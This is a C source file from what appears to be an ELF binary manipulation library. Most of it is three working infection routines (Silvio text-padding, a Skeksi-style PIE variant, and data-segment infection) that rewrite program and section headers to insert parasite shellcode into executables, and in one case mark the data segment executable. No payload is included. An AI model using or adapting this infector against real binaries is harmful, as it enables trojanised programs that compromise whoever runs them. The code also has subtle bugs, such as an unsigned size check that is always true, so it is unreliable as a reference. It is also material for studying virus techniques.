/*
 MIT License
 
 Copyright (c) 2024 SecNotes
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
 
 The above copyright notice and this permission notice shall be included in all
 copies or substantial portions of the Software.
 
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.
*/

#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <elf.h>
#include <stdlib.h>
#include <unistd.h>
#include "lib/elfutil.h"
#include "lib/util.h"

int MODE = ELFCLASS64;

/**
 * @brief 得到段的映射地址范围
 * Obtain the mapping address range of the segment
 * @param elf_name 
 * @param type segment type
 * @param start output args
 * @param end output args
 * @return int error code {-1:error,0:sucess}
 */
int get_segment_range(char *elf_name, int type, uint64_t *start, uint64_t *end) {
    int fd;
    struct stat st;
    uint8_t *elf_map;
    uint64_t low = 0xffffffff;
    uint64_t high = 0;

    fd = open(elf_name, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    if (fstat(fd, &st) < 0) {
        perror("fstat");
        return -1;
    }

    elf_map = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (elf_map == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    if (MODE == ELFCLASS32) {
        Elf32_Ehdr *ehdr = (Elf32_Ehdr *)elf_map;
        Elf32_Phdr *phdr = (Elf32_Phdr *)&elf_map[ehdr->e_phoff];
        // 计算地址的最大值和最小值
        // calculate the maximum and minimum values of the virtual address
        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdr[i].p_type == type) {
                if (phdr[i].p_vaddr < low)
                    low = phdr[i].p_vaddr;
                if (phdr[i].p_vaddr + phdr[i].p_memsz > high)
                    high = phdr[i].p_vaddr + phdr[i].p_memsz;
            }
        }
    }

    if (MODE == ELFCLASS64) {
        Elf64_Ehdr *ehdr = (Elf64_Ehdr *)elf_map;
        Elf64_Phdr *phdr = (Elf64_Phdr *)&elf_map[ehdr->e_phoff];
        // 计算地址的最大值和最小值
        // calculate the maximum and minimum values of the virtual address
        for (int i = 0; i < ehdr->e_phnum; i++) {
            if (phdr[i].p_type == type) {
                if (phdr[i].p_vaddr < low)
                    low = phdr[i].p_vaddr;
                if (phdr[i].p_vaddr + phdr[i].p_memsz > high)
                    high = phdr[i].p_vaddr + phdr[i].p_memsz;
            }
        }
    }

    *start = low;
    *end = high; 

    close(fd);
    munmap(elf_map, st.st_size);
    return 0;
}

/**
 * @brief 得到段的映射地址范围
 * Obtain the mapping address range of the segment
 * @param elf Elf custom structure
 * @param type segment type
 * @param start output args
 * @param end output args
 * @return int error code {-1:error,0:sucess}
 */
int get_segment_range_t(Elf *elf, int type, uint64_t *start, uint64_t *end) {
    uint64_t low = 0xffffffff;
    uint64_t high = 0;

    if (elf->class == ELFCLASS32) {
        // 计算地址的最大值和最小值
        // calculate the maximum and minimum values of the virtual address
        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (elf->data.elf32.phdr[i].p_type == type) {
                if (elf->data.elf32.phdr[i].p_vaddr < low)
                    low = elf->data.elf32.phdr[i].p_vaddr;
                if (elf->data.elf32.phdr[i].p_vaddr + elf->data.elf32.phdr[i].p_memsz > high)
                    high = elf->data.elf32.phdr[i].p_vaddr + elf->data.elf32.phdr[i].p_memsz;
            }
        }
    } else if (elf->class == ELFCLASS64) {
        // 计算地址的最大值和最小值
        // calculate the maximum and minimum values of the virtual address
        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (elf->data.elf64.phdr[i].p_type == type) {
                if (elf->data.elf64.phdr[i].p_vaddr < low)
                    low = elf->data.elf64.phdr[i].p_vaddr;
                if (elf->data.elf64.phdr[i].p_vaddr + elf->data.elf64.phdr[i].p_memsz > high)
                    high = elf->data.elf64.phdr[i].p_vaddr + elf->data.elf64.phdr[i].p_memsz;
            }
        }
    } else {
        return ERR_ELF_CLASS;
    }

    *start = low;
    *end = high; 
    return NO_ERR;
}

/**
 * @brief 在文件offset偏移处插入一段数据
 * insert a piece of data at the offset of the file
 * @param elfname elf file name
 * @param offset elf file offset
 * @param data data
 * @param data_size data size
 * @return int result code {-1:error,0:false,1:true}
 */
int insert_data(const char *filename, off_t offset, const void *data, size_t data_size) {
    FILE *file = fopen(filename, "r+b");
    if (file == NULL) {
        perror("fopen");
        return -1;
    }

    // 获取文件末尾位置
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);

    // 将文件指针移动到插入位置
    fseek(file, offset, SEEK_SET);

    // 读取插入位置后的数据
    char *temp_buffer = (char *)malloc(file_size - offset);
    fread(temp_buffer, file_size - offset, 1, file);

    // 将数据写入插入位置
    fseek(file, offset, SEEK_SET);
    fwrite(data, data_size, 1, file);

    // 写入剩余数据
    fwrite(temp_buffer, file_size - offset, 1, file);

    // 释放内存并关闭文件
    free(temp_buffer);
    fclose(file);
    return 0;
}

/**
 * @brief 在文件offset偏移处插入一段数据
 * insert a piece of data at the offset of the file
 * @param elf elf file custom structure
 * @param offset elf file offset
 * @param data data
 * @param data_size data size
 * @return int result code {-1:error,0:false,1:true}
 */
int insert_data_t(Elf *elf, off_t offset, const void *data, size_t data_size) {
    if (offset > elf->size) {
        PRINT_DEBUG("offset out ouf bounds\n");
        return ERR_OUT_OF_BOUNDS; // 插入位置超出当前文件大小
    }

    // 扩展内存空间
    // expand file
    size_t new_size = elf->size + data_size;
    ftruncate(elf->fd, new_size);
    void* new_map = mremap(elf->mem, elf->size, new_size, MREMAP_MAYMOVE);
    if (new_map == MAP_FAILED) {
        PRINT_DEBUG("mremap\n");
        return ERR_MEM;
    } else {
        // reinit custom elf structure
        elf->mem = new_map;
        elf->size = new_size;
        if (elf->class == ELFCLASS32) {
            elf->data.elf32.ehdr = (Elf32_Ehdr *)elf->mem;
            elf->data.elf32.shdr = (Elf32_Shdr *)&elf->mem[elf->data.elf32.ehdr->e_shoff];
            elf->data.elf32.phdr = (Elf32_Phdr *)&elf->mem[elf->data.elf32.ehdr->e_phoff];
        } else if (elf->class == ELFCLASS64) {
            elf->data.elf64.ehdr = (Elf64_Ehdr *)elf->mem;
            elf->data.elf64.shdr = (Elf64_Shdr *)&elf->mem[elf->data.elf64.ehdr->e_shoff];
            elf->data.elf64.phdr = (Elf64_Phdr *)&elf->mem[elf->data.elf64.ehdr->e_phoff];
        } else {
            return ERR_ELF_CLASS;
        }
    }

    // 移动数据
    if (copy_data(elf->mem + offset, elf->mem + offset + data_size, elf->size - offset) == NO_ERR) {
        // 插入新数据
        memcpy(elf->mem + offset, data, data_size);
        return NO_ERR;
    } else {
        PRINT_DEBUG("error: copy_data\n");
        return ERR_COPY;
    }
}

/*
                                                             
                                                             
      memory layout                  file layout             
                                                             
  ─── ┌──────────────┐ 0x0000        ┌──────────────┐ 0x0000 
  ▲   │   ehdr/phdr  │          const│   ehdr/phdr  │        
  │   ├──────────────┤ 0x1000        ├──────────────┤ 0x1000 
  │   │     TEXT     │               │     TEXT     │        
  │   ├──────────────┤               ├──────────────┤        
 const│xxxxxxxxxxxxxx│               │xxxxxxxxxxxxxx│        
      ├──────────────┤               ├───────┬──────┤        
  │   │              │               │       │      │        
  │   │              │               │       │      │        
  ▼   │              │               │       ▼      │        
  ─── │              │               │   ONE_PAGE   │        
      │              │               │              │        
      └──────────────┘               ├──────────────┤        
                                     │     shdr     │        
                                     └──────────────┘        
                                                             
 */

/**
 * @brief 使用silvio感染算法，填充text段
 * use the Silvio infection algorithm to fill in text segments
 * @param elf elf file custom structure
 * @param parasite shellcode
 * @param size shellcode size (< 1KB)
 * @return uint64_t parasite address {-1:error,0:false,address}
 */
uint64_t infect_silvio(Elf *elf, char *parasite, size_t size) {
    int text_index = 0;
    uint64_t parasite_addr = 0;
    uint64_t parasite_offset = 0;
    if (elf->class == ELFCLASS32) {
        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (elf->data.elf32.phdr[i].p_type == PT_LOAD) {
                // 1. text段扩容size
                if (elf->data.elf32.phdr[i].p_flags == (PF_R | PF_X)) {
                    text_index = i;
                    parasite_addr = elf->data.elf32.phdr[i].p_vaddr + elf->data.elf32.phdr[i].p_memsz;
                    parasite_offset = elf->data.elf32.phdr[i].p_offset + elf->data.elf32.phdr[i].p_filesz;
                    elf->data.elf32.phdr[i].p_memsz += size;
                    elf->data.elf32.phdr[i].p_filesz += size;
                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                    break;
                }
            }
        }

        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (elf->data.elf32.phdr[i].p_type == PT_LOAD) {
                // 2. 其他load段向后偏移
                if (elf->data.elf32.phdr[i].p_offset > elf->data.elf32.phdr[text_index].p_offset) {
                    //phdr[i].p_vaddr += ONE_PAGE;
                    //phdr[i].p_paddr += ONE_PAGE;
                    elf->data.elf32.phdr[i].p_offset += ONE_PAGE;
                }
            }
        }

        for (int i = 0; i < elf->data.elf32.ehdr->e_shnum; i++) {
            // 3. 寄生代码之后的节，偏移PAGE_SIZE
            if (elf->data.elf32.shdr[i].sh_offset > parasite_offset) {
                //shdr[i].sh_addr += ONE_PAGE;
                elf->data.elf32.shdr[i].sh_offset += ONE_PAGE;
            }
            // 4. text节，偏移size
            else if (elf->data.elf32.shdr[i].sh_addr + elf->data.elf32.shdr[i].sh_size == parasite_addr) {
                elf->data.elf32.shdr[i].sh_size += size;
            }
        }
        // 5. elf节头偏移PAGE_SIZE
        elf->data.elf32.ehdr->e_shoff += ONE_PAGE;
    }

    else if (elf->class == ELFCLASS64) {
        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (elf->data.elf64.phdr[i].p_type == PT_LOAD) {
                // 1. text段扩容size
                if (elf->data.elf64.phdr[i].p_flags == (PF_R | PF_X)) {
                    text_index = i;
                    parasite_addr = elf->data.elf64.phdr[i].p_vaddr + elf->data.elf64.phdr[i].p_memsz;
                    parasite_offset = elf->data.elf64.phdr[i].p_offset + elf->data.elf64.phdr[i].p_filesz;
                    elf->data.elf64.phdr[i].p_memsz += size;
                    elf->data.elf64.phdr[i].p_filesz += size;
                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                    break;
                }
            }
        }

        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (elf->data.elf64.phdr[i].p_type == PT_LOAD) {
                // 2. 其他load段向后偏移
                if (elf->data.elf64.phdr[i].p_offset > elf->data.elf64.phdr[text_index].p_offset) {
                    elf->data.elf64.phdr[i].p_offset += ONE_PAGE;
                }
            }
        }

        for (int i = 0; i < elf->data.elf64.ehdr->e_shnum; i++) {
            // 3. 寄生代码之后的节，偏移PAGE_SIZE
            if (elf->data.elf64.shdr[i].sh_offset > parasite_offset) {
                elf->data.elf64.shdr[i].sh_offset += ONE_PAGE;
            }
            // 4. text节，偏移size
            else if (elf->data.elf64.shdr[i].sh_addr + elf->data.elf64.shdr[i].sh_size == parasite_addr) {
                elf->data.elf64.shdr[i].sh_size += size;
            }
        }
        // 5. elf节头偏移PAGE_SIZE
        elf->data.elf64.ehdr->e_shoff += ONE_PAGE;
    }

    // 6. 插入寄生代码
    char *parasite_expand = malloc(ONE_PAGE);
    memset(parasite_expand, 0, ONE_PAGE);
    memcpy(parasite_expand, parasite, ONE_PAGE - size > 0? size: ONE_PAGE);
    int err = insert_data_t(elf, parasite_offset, parasite_expand, ONE_PAGE);
    if (err == NO_ERR) {
        PRINT_VERBOSE("insert successfully\n");
        free(parasite_expand);
        return parasite_addr;
    } else {
        PRINT_ERROR("insert failed\n");
        free(parasite_expand);
        return err;
    }
}

/*
The address of the load segment in memory cannot be easily changed
.rela.dyn->offset->.dynamic
                                                            
      memory layout                  file layout             
                                                             
      ┌──────────────┐ 0x0000        ┌──────────────┐ 0x0000 
      │xxxxxxxxxxxxxx│          const│   ehdr/phdr  │        
  ─── ├──────────────┤ 0x1000        ├──────────────┤ 0x1000 
  ▲   │     TEXT     │               │xxxxxxxxxxxxxx│        
  │   ├──────────────┤               ├──────────────┤        
  │   │              │               │     TEXT     │        
 const│              │               ├──────────────┤        
  │   │              │               │              │        
  │   │              │               │              │        
  ▼   │              │               │              │        
  ─── ├──────────────┤               │              │        
      │  ehrdr/phdr  │               │              │        
      └──────────────┘               ├──────────────┤        
                                     │     shdr     │        
                                     └──────────────┘           
                                                                     
*/                                                      

/**
 * @brief 使用skeksi增强版感染算法，填充text段. 此算法适用于开启pie的二进制
 * use the Skeksi plus infection algorithm to fill in text segments
 * this algorithm is suitable for opening binary pie
 * @param elf elf file custom structure
 * @param parasite shellcode
 * @param size shellcode size (< 1KB)
 * @return uint64_t parasite address {-1:error,0:false,address}
 */
uint64_t infect_skeksi_pie(Elf *elf, char *parasite, size_t size) {
    int text_index;
    uint64_t parasite_addr;
    size_t distance;
    uint64_t min_paddr = 0x0;
    uint64_t origin_text_vaddr = 0x0;
    uint64_t origin_text_offset = 0x0;
    size_t origin_text_size = 0x0;
    int err = 0;

    uint64_t vstart, vend;
    err = get_segment_range_t(elf, PT_LOAD, &vstart, &vend);
    if (err != NO_ERR) {
        PRINT_ERROR("error get segment range\n");
        return err;
    }

    if (elf->class == ELFCLASS32) {
        // memory layout
        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (elf->data.elf32.phdr[i].p_type == PT_LOAD) {
                if (elf->data.elf32.phdr[i].p_flags == (PF_R | PF_X)) {
                    text_index = i;
                    for (int j = 0; j < i; j++) {
                        if (elf->data.elf32.phdr[j].p_vaddr < min_paddr)
                            min_paddr = elf->data.elf32.phdr[j].p_vaddr;
                    }
                    origin_text_vaddr = elf->data.elf32.phdr[i].p_vaddr;
                    origin_text_size = elf->data.elf32.phdr[i].p_memsz;
                    origin_text_offset = elf->data.elf32.phdr[i].p_offset;
                    elf->data.elf32.phdr[i].p_memsz += ONE_PAGE;
                    elf->data.elf32.phdr[i].p_vaddr -= ONE_PAGE;
                    elf->data.elf32.phdr[i].p_paddr -= ONE_PAGE;
                    parasite_addr = elf->data.elf32.phdr[i].p_vaddr;
                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                    break;
                }
            }
        }

        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (i == text_index)
                continue;
            if (elf->data.elf32.phdr[i].p_vaddr < origin_text_vaddr) {
                elf->data.elf32.phdr[i].p_vaddr += align_to_4k(vend);
                elf->data.elf32.phdr[i].p_paddr += align_to_4k(vend);
                continue;
            }

            // if (phdr[i].p_vaddr > origin_text_vaddr) {
            //     phdr[i].p_vaddr += ONE_PAGE;
            // }
        }

        for (int i = 0; i < elf->data.elf32.ehdr->e_shnum; i++) {
            if (elf->data.elf32.shdr[i].sh_addr == origin_text_vaddr) {
                elf->data.elf32.shdr[i].sh_addr -= ONE_PAGE;
                elf->data.elf32.shdr[i].sh_size += ONE_PAGE;
            }
            else if (elf->data.elf32.shdr[i].sh_addr < origin_text_vaddr) {
                elf->data.elf32.shdr[i].sh_addr += align_to_4k(vend);
            }
            // else if (shdr[i].sh_addr >= origin_text_vaddr + origin_text_size) {
            //     shdr[i].sh_addr += ONE_PAGE;
            // }
        }

        // start----------------------- edit .dynamic
        // 32: REL
        for (int i = 0; i < elf->data.elf32.dyn_count; i++) {
            if (elf->data.elf32.dyn[i].d_tag == DT_STRTAB |
                elf->data.elf32.dyn[i].d_tag == DT_SYMTAB |
                elf->data.elf32.dyn[i].d_tag == DT_REL | 
                elf->data.elf32.dyn[i].d_tag == DT_JMPREL | 
                elf->data.elf32.dyn[i].d_tag == DT_VERNEED | 
                elf->data.elf32.dyn[i].d_tag == DT_VERSYM) {
                    elf->data.elf32.dyn[i].d_un.d_val += align_to_4k(vend);
            } 
        }
        // end------------------------- edit .dynamic

        // file layout
        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (i == text_index) {
                elf->data.elf32.phdr[i].p_filesz += ONE_PAGE;
                continue;
            }
            if (elf->data.elf32.phdr[i].p_offset > origin_text_offset) {
                elf->data.elf32.phdr[i].p_offset += ONE_PAGE;
            }
        }

        for (int i = 0; i < elf->data.elf32.ehdr->e_shnum; i++) {
            if (elf->data.elf32.shdr[i].sh_offset >= origin_text_offset + origin_text_size) {
                elf->data.elf32.shdr[i].sh_offset += ONE_PAGE;
            }
        }

        // elf节头表偏移PAGE_SIZE
        elf->data.elf32.ehdr->e_shoff += ONE_PAGE;
    }

    else if (elf->class == ELFCLASS64) {
        // memory layout
        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (elf->data.elf64.phdr[i].p_type == PT_LOAD) {
                if (elf->data.elf64.phdr[i].p_flags == (PF_R | PF_X)) {
                    text_index = i;
                    for (int j = 0; j < i; j++) {
                        if (elf->data.elf64.phdr[j].p_vaddr < min_paddr)
                            min_paddr = elf->data.elf64.phdr[j].p_vaddr;
                    }
                    origin_text_vaddr = elf->data.elf64.phdr[i].p_vaddr;
                    origin_text_size = elf->data.elf64.phdr[i].p_memsz;
                    origin_text_offset = elf->data.elf64.phdr[i].p_offset;
                    elf->data.elf64.phdr[i].p_memsz += ONE_PAGE;
                    elf->data.elf64.phdr[i].p_vaddr -= ONE_PAGE;
                    elf->data.elf64.phdr[i].p_paddr -= ONE_PAGE;
                    parasite_addr = elf->data.elf64.phdr[i].p_vaddr;
                    PRINT_VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
                    break;
                }
            }
        }

        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (i == text_index)
                continue;
            if (elf->data.elf64.phdr[i].p_vaddr < origin_text_vaddr) {
                elf->data.elf64.phdr[i].p_vaddr += align_to_4k(vend);
                elf->data.elf64.phdr[i].p_paddr += align_to_4k(vend);
                continue;
            }
        }

        for (int i = 0; i < elf->data.elf64.ehdr->e_shnum; i++) {
            if (elf->data.elf64.shdr[i].sh_addr == origin_text_vaddr) {
                elf->data.elf64.shdr[i].sh_addr -= ONE_PAGE;
                elf->data.elf64.shdr[i].sh_size += ONE_PAGE;
            }
            else if (elf->data.elf64.shdr[i].sh_addr < origin_text_vaddr) {
                elf->data.elf64.shdr[i].sh_addr += align_to_4k(vend);
            }
        }

        // start----------------------- edit .dynamic
        // 64: RELA
        for (int i = 0; i < elf->data.elf64.dyn_count; i++) {
            if (elf->data.elf64.dyn[i].d_tag == DT_STRTAB |
                elf->data.elf64.dyn[i].d_tag == DT_SYMTAB |
                elf->data.elf64.dyn[i].d_tag == DT_RELA | 
                elf->data.elf64.dyn[i].d_tag == DT_JMPREL | 
                elf->data.elf64.dyn[i].d_tag == DT_VERNEED | 
                elf->data.elf64.dyn[i].d_tag == DT_VERSYM) {
                    elf->data.elf64.dyn[i].d_un.d_val += align_to_4k(vend);
            } 
        }
        // end------------------------- edit .dynamic

        // file layout
        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (i == text_index) {
                elf->data.elf64.phdr[i].p_filesz += ONE_PAGE;
                continue;
            }
            if (elf->data.elf64.phdr[i].p_offset > origin_text_offset) {
                elf->data.elf64.phdr[i].p_offset += ONE_PAGE;
            }
        }

        for (int i = 0; i < elf->data.elf64.ehdr->e_shnum; i++) {
            if (elf->data.elf64.shdr[i].sh_offset >= origin_text_offset + origin_text_size) {
                elf->data.elf64.shdr[i].sh_offset += ONE_PAGE;
            }
        }

        // elf节头表偏移PAGE_SIZE
        elf->data.elf64.ehdr->e_shoff += ONE_PAGE;
    }

    // insert parasite code
    char *parasite_expand = malloc(ONE_PAGE);
    memset(parasite_expand, 0, ONE_PAGE);
    memcpy(parasite_expand, parasite, ONE_PAGE - size > 0? size: ONE_PAGE);
    err = insert_data_t(elf, origin_text_offset, parasite_expand, ONE_PAGE);
    free(parasite_expand);
    if (err == NO_ERR) {
        PRINT_VERBOSE("insert successfully\n");
        return parasite_addr;
    } else {
        PRINT_ERROR("insert failed\n");
        return err;
    }
}

/*
                                                             
      memory layout                  file layout             
                                                             
  ─── ┌──────────────┐ 0x0000    ─── ┌──────────────┐ 0x0000 
  ▲   │  ehdr/phdr   │           ▲   │  ehdr/phdrr  │        
  │   ├──────────────┤ 0x1000    │   ├──────────────┤ 0x1000 
  │   │     TEXT     │           │   │     TEXT     │        
  │   ├──────────────┤           │   ├──────────────┤        
  │   │              │           │   │              │        
 const│              │          const│              │        
  │   │              │           │   │              │        
  │   │              │           │   │              │        
  │   │              │           │   │              │        
  │   ├──────────────┤           │   ├──────────────┤        
  ▼   │     data     │           ▼   │     data     │        
  ─── ├──────────────┤           ─── ├──────────────┤        
      │xxxxxxxxxxxxxx│               │xxxxxxxxxxxxxx│        
      └──────────────┘               ├──────────────┤        
                                     │     shdr     │        
                                     └──────────────┘        
*/

/**
 * @brief 填充text段感染
 * fill in data segments infection algorithm
 * @param elf file custom structure
 * @param parasite shellcode
 * @param size shellcode size (< 1KB)
 * @return uint64_t parasite address {-1:error,0:false,address}
 */
uint64_t infect_data(Elf *elf, char *parasite, size_t size) {
    int data_index;
    uint64_t origin_data_offset;
    int err = 0;

    uint64_t vstart, vend;
    err = get_segment_range_t(elf, PT_LOAD, &vstart, &vend);
    if (err != NO_ERR) {
        PRINT_ERROR("error get segment range\n");
        return err;
    }

    if (elf->class == ELFCLASS32) {
        for (int i = 0; i < elf->data.elf32.ehdr->e_phnum; i++) {
            if (elf->data.elf32.phdr[i].p_vaddr + elf->data.elf32.phdr[i].p_memsz == vend && elf->data.elf32.phdr[i].p_type == PT_LOAD) {
                data_index = i;
                origin_data_offset = elf->data.elf32.phdr[i].p_offset + elf->data.elf32.phdr[i].p_filesz;
                elf->data.elf32.phdr[i].p_memsz += size;
                elf->data.elf32.phdr[i].p_filesz += size;
                elf->data.elf32.phdr[i].p_flags |= PF_X;
                PRINT_VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
                break;
            }
        }

        for (int i = 0; i < elf->data.elf32.ehdr->e_shnum; i++) {
            if (elf->data.elf32.shdr[i].sh_addr + elf->data.elf32.shdr[i].sh_size == vend) {
                elf->data.elf32.shdr[i].sh_size += size;
            } else if (elf->data.elf32.shdr[i].sh_offset >= origin_data_offset) {
                elf->data.elf32.shdr[i].sh_offset += size;
            }
        }

        elf->data.elf32.ehdr->e_shoff += size;
    }

    else if (elf->class == ELFCLASS64) {
        for (int i = 0; i < elf->data.elf64.ehdr->e_phnum; i++) {
            if (elf->data.elf64.phdr[i].p_vaddr + elf->data.elf64.phdr[i].p_memsz == vend && elf->data.elf64.phdr[i].p_type == PT_LOAD) {
                data_index = i;
                origin_data_offset = elf->data.elf64.phdr[i].p_offset + elf->data.elf64.phdr[i].p_filesz;
                elf->data.elf64.phdr[i].p_memsz += size;
                elf->data.elf64.phdr[i].p_filesz += size;
                elf->data.elf64.phdr[i].p_flags |= PF_X;
                PRINT_VERBOSE("expand [%d] DATA Segment, address: [0x%x], offset: [0x%x]\n", i, vend, origin_data_offset);
                break;
            }
        }

        for (int i = 0; i < elf->data.elf64.ehdr->e_shnum; i++) {
            if (elf->data.elf64.shdr[i].sh_addr + elf->data.elf64.shdr[i].sh_size == vend) {
                elf->data.elf64.shdr[i].sh_size += size;
            } else if (elf->data.elf64.shdr[i].sh_offset >= origin_data_offset) {
                elf->data.elf64.shdr[i].sh_offset += size;
            }
        }

        elf->data.elf64.ehdr->e_shoff += size;
    }

    // insert parasite code
    err = insert_data_t(elf, origin_data_offset, parasite, size);
    if (err == NO_ERR) {
        PRINT_VERBOSE("insert successfully\n");
        return vend;
    } else {
        PRINT_ERROR("insert failed\n");
        return err;
    }
}